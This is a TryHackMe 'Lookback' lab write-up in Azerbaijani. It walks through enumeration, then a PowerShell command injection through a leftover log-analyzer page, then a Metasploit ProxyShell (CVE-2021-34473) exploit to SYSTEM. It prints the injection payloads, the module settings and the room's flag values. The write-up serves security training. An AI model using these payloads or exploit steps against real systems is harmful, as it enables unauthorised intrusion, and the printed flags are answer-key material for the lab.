# TryHackMe — Lookback Writeup (Azərbaycan dilində)

**Otaq linki:** https://tryhackme.com/room/lookback  
**Çətinlik:** Orta  
**Mövzu:** IIS, Command Injection, ProxyShell (CVE-2021-34473), Active Directory

---

## Ümumi Baxış

Bu lab-da **Lookback** şirkətinin Active Directory mühitini araşdırırıq. Şirkət tələsik şəkildə AD qurub və bir sıra kritik zəifliklər buraxıb. Biz həmin zəifliklərdən istifadə edərək sistemi tam ələ keçiririk.

---

## Flaglər

| Flag | Dəyər |
|------|-------|
| Service User Flag | `THM{Security_Through_Obscurity_Is_Not_A_Defense}` |
| User Flag | `THM{Stop_Reading_Start_Doing}` |
| Root Flag | `THM{Looking_Back_Is_Not_Always_Bad}` |

---

## Addım 1: Port Scan (Nmap)

```bash
nmap -Pn -sV -sC 10.114.144.57
```

**`-Pn`** — ping olmadan scan et (bu maşın ping-ə cavab vermir)

**Nəticə:**

| Port | Servis | Qeyd |
|------|--------|------|
| 80/tcp | IIS 10.0 | HTTP |
| 443/tcp | IIS 10.0 | HTTPS — Outlook Web Access |
| 3389/tcp | RDP | Uzaqdan masaüstü |

**Domain məlumatları:**
- Domain: `thm.local`
- Kompüter: `WIN-12OUO7A66M7.thm.local`

---

## Addım 2: Web Enumeration

### Gobuster ilə qovluq axtarışı

**Port 80:**
```bash
gobuster dir -u http://10.114.144.57 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404
```

**Port 443:**
```bash
gobuster dir -u https://10.114.144.57 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404 -k
```

**Tapılan endpointlər:**

| Endpoint | Status | Qeyd |
|----------|--------|------|
| `/rpc` | 401 | Credentials lazımdır |
| `/ecp` | 302 | Exchange Control Panel |
| `/powershell` | 401 | PowerShell remoting |
| `/test` | 200 | **Gizli test səhifəsi!** |

---

## Addım 3: /test Səhifəsi — Birinci Flag

Brauzerdə aç:
```
http://10.114.144.57/test
```

Səhifədə yazır:
> **"This interface should be removed on production!"**

**Birinci flag tapıldı:**
```
THM{Security_Through_Obscurity_Is_Not_A_Defense}
```

Həmçinin səhifədə **LOG ANALYZER** aləti var — Path input sahəsi və Run düyməsi.

---

## Addım 4: Command Injection

### Zəiflik Nədir?

Server arxada PowerShell ilə belə işləyir:

```powershell
Get-Content('C:\<sənin inputun>')
```

Input **heç yoxlanmadan** birbaşa PowerShell-ə ötürülür!

### Exploit Məntiqi

Normal input:
```
BitlockerActiveMonitoringLogs
```

Server icra edir:
```powershell
Get-Content('C:\BitlockerActiveMonitoringLogs')
```

Bizim zərərli input:
```
BitlockerActiveMonitoringLogs') ; whoami ; #
```

Server icra edir:
```powershell
Get-Content('C:\BitlockerActiveMonitoringLogs') ; whoami ; #')
```

**Hər hissənin izahı:**

| Hissə | Məna |
|-------|------|
| `BitlockerActiveMonitoringLogs` | Normal fayl adı |
| `'` | Tırnağı bağlayır |
| `)` | Mötərizəni bağlayır |
| `;` | Birinci komanda bitdi |
| `whoami` | Bizim əlavə etdiyimiz komanda |
| `;` | İkinci komanda bitdi |
| `#` | Arxada qalan `')` hissəsini comment edir |

### İstifadəçiləri Tap

```
BitlockerActiveMonitoringLogs') ; dir C:\Users ; #
```

**Nəticə:**
```
Administrator
dev
Public
```

### dev Desktop-unu Oxu

```
BitlockerActiveMonitoringLogs') ; dir C:\Users\dev\Desktop ; #
```

```
BitlockerActiveMonitoringLogs') ; type C:\Users\dev\Desktop\flag.txt ; #
```

**İkinci flag tapıldı:**
```
THM{Stop_Reading_Start_Doing}
```

### todo.txt Oxu

```
BitlockerActiveMonitoringLogs') ; type C:\Users\dev\Desktop\todo.txt ; #
```

**Nəticə:**
```
- Promote Server to Domain Controller [DONE]
- Setup Microsoft Exchange [DONE]
- Setup IIS [DONE]
- Remove the log analyzer [TO BE DONE]
- Install the Security Update for MS Exchange [TO BE DONE]
- Setup LAPS [TO BE DONE]

Email contacts:
joe@thm.local
carol@thm.local
dev-infrastracture-team@thm.local
```

**Kritik məlumat:** MS Exchange Security Update **qurulmayıb!**

---

## Addım 5: ProxyShell Exploit (CVE-2021-34473)

### ProxyShell Nədir?

Microsoft Exchange-in köhnə versiyalarında olan kritik zəiflikdir. Bu zəiflik vasitəsilə autentifikasiya olmadan **SYSTEM** səviyyəsində kod icra etmək mümkündür.

### Exploit Necə İşləyir?

```
1. Exploit → Exchange-ə email hesabına "Mailbox Import Export" rolu verir
2. Exploit → Draft email-ə webshell faylı əlavə edir
3. Exploit → Draft email-i export edib serverin web qovluğuna yazır
4. Exploit → Webshell-i HTTP ilə çağırır
5. Exchange → Webshell-i SYSTEM kimi icra edir
6. Biz → SYSTEM shell alırıq!
```

### Metasploit ilə Exploit

```bash
msfconsole
use exploit/windows/http/exchange_proxyshell_rce
set RHOSTS 10.114.144.57
set LHOST 10.114.81.228
set LPORT 5555
set EMAIL dev-infrastracture-team@thm.local
run
```

**Niyə `dev-infrastracture-team@thm.local`?**
- `joe@thm.local` — mailbox tapılmadı
- `carol@thm.local` — mailbox tapılmadı
- `dev-infrastracture-team@thm.local` — mailbox var, exploit işlədi!

**Nəticə:**
```
[+] Meterpreter session 1 opened
meterpreter >
```

---

## Addım 6: Root Flag

Meterpreter shell-də:

```bash
meterpreter > shell
```

```cmd
cd C:\Users\Administrator\Documents
type flag.txt
```

**Root flag tapıldı:**
```
THM{Looking_Back_Is_Not_Always_Bad}
```

---

## Hücumun Tam Xəritəsi

```
Nmap scan → Port 80, 443, 3389 tapıldı
        ↓
Gobuster → /test səhifəsi tapıldı
        ↓
/test səhifəsi → Birinci flag + LOG ANALYZER
        ↓
Command Injection → BitlockerLogs') ; komanda ; #
        ↓
todo.txt oxundu → Exchange patch yoxdur!
        ↓
İkinci flag tapıldı
        ↓
ProxyShell exploit → SYSTEM oldu
        ↓
C:\Users\Administrator\Documents\flag.txt
        ↓
Root flag! 🎉
```

---

## Öyrəndiklərimiz

| Zəiflik | Təsvir | Həll yolu |
|---------|--------|-----------|
| Test interfeysi silinməyib | Gizli səhifə tapıldı | Production-da test faylları silinməlidir |
| Command Injection | Input sanitize edilmirdi | İstifadəçi inputu yoxlanmalıdır |
| ProxyShell (CVE-2021-34473) | Exchange yenilənməmişdi | Security patch-lər vaxtında qurulmalıdır |
| LAPS qurulmayıb | Zəif şifrə siyasəti | LAPS qurulmalıdır |

---

## İstifadə Olunan Alətlər

| Alət | İstifadəsi |
|------|-----------|
| `nmap` | Port scan |
| `gobuster` | Qovluq/fayl axtarışı |
| `Metasploit` | ProxyShell exploit |
| Browser | Web interfeys analizi |

---

*Writeup Azərbaycan dilində hazırlanmışdır.*
